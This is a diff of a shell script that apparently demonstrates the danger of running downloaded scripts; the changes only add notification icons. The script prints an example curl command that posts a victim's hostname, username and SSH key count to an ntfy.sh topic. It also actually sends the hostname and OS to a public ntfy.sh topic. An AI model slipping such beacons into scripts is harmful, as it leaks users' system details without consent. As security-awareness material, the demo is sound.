@@ -10,6 +10,7 @@ echo "A real attack would silently POST to an attacker-controlled topic."
 echo ""
 
 TOPIC="totally-safe-demo-topic-$(whoami)"
+ICON_URL="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f6a8.png"
 HOSTNAME_VAL=$(hostname)
 USER_VAL=$(whoami)
 SSH_KEY_COUNT=$(ls ~/.ssh/*.pub 2>/dev/null | wc -l | tr -d ' ')
@@ -19,6 +20,7 @@ OS_VAL=$(uname -s)
 echo "The payload that *would* be sent:"
 echo "  Topic  : https://ntfy.sh/$TOPIC"
 echo "  Title  : New victim connected"
+echo "  Icon   : $ICON_URL"
 echo "  Message: host=$HOSTNAME_VAL user=$USER_VAL ssh_keys=$SSH_KEY_COUNT git=$GIT_EMAIL"
 echo ""
 echo "The curl command that would do it:"
@@ -27,6 +29,7 @@ cat <<'EXAMPLE'
   curl -s \
     -H "Title: New victim connected" \
     -H "Priority: high" \
+    -H "Icon: https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f6a8.png" \
     -H "Tags: skull" \
     -d "host=$(hostname) user=$(whoami) ssh_keys=$(ls ~/.ssh/*.pub 2>/dev/null | wc -l)" \
     https://ntfy.sh/my-secret-topic
@@ -40,6 +43,7 @@ echo ""
 curl -s \
   -H "Title: totally-safe-downloads was run" \
   -H "Priority: default" \
+  -H "Icon: $ICON_URL" \
   -H "Tags: wave" \
   -d "$(hostname) just curled ntfy-demo.sh. They are working on $OS_VAL" \
   "https://ntfy.sh/$TOPIC"
